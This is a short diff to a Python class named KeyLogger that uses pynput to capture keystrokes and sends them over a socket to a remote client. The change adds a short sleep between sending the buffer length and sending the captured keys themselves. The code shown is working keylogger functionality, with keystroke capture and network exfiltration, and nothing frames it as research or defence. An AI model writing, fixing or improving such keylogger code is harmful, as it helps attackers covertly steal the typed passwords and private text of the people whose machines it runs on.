@@ -1,4 +1,5 @@
 from pynput.keyboard import Listener, Key
+import time
 
 class KeyLogger:
     def __init__(self, sock = None):
@@ -49,6 +50,7 @@ class KeyLogger:
     
     def print_keys(self):
         self.client.sendall(bytes(str(len(self.keys)), "utf8"))
+        time.sleep(0.1)
         self.client.sendall(bytes(self.keys, "utf8"))
         self.keys = ''
         pass
